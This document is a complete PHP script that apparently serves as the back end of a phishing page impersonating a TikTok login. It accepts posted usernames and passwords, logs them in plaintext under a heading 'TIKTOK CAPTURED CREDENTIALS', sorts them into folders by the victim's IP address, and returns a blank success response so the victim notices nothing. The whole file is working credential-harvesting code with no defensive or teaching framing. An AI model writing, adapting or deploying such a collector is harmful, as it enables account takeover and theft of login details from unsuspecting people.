<?php

ob_start();

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();
if ($ip === '127.0.0.1') {
    $ip = 'Localhost';
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(200);
    ob_end_clean();
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);

$username = trim($input['username'] ?? '');
$password = trim($input['password'] ?? '');

if (empty($username) || empty($password)) {
    http_response_code(200);
    ob_end_clean();
    exit();
}

$ip = getUserIP();

$baseDir  = __DIR__ . "/../Data";
$userDir  = $baseDir . "/" . $ip . "/Info";
$filePath = $userDir . "/credentials.txt";

if (!is_dir($userDir)) {
    mkdir($userDir, 0777, true);
}

$username = preg_replace('/[\r\n\t]/', '_', $username);
$password = preg_replace('/[\r\n\t]/', '_', $password);
$username = substr($username, 0, 1024);
$password = substr($password, 0, 1024);

$timestamp = date('Y-m-d H:i:s');

$logEntry = "=== TIKTOK CAPTURED CREDENTIALS ===\n";
$logEntry .= "Time: $timestamp\n";
$logEntry .= "User: $username\n";
$logEntry .= "Pass: $password\n";
$logEntry .= "----------\n\n";

$result = @file_put_contents($filePath, $logEntry, FILE_APPEND | LOCK_EX);

if ($result === false) {
    $debugLog = __DIR__ . '/debug_log_fail.txt';
    @file_put_contents($debugLog, "Fail @ $timestamp | IP: $ip | User: $username\n", FILE_APPEND);
}

@chmod($filePath, 0644);

http_response_code(200);
ob_end_clean();
exit();
?>
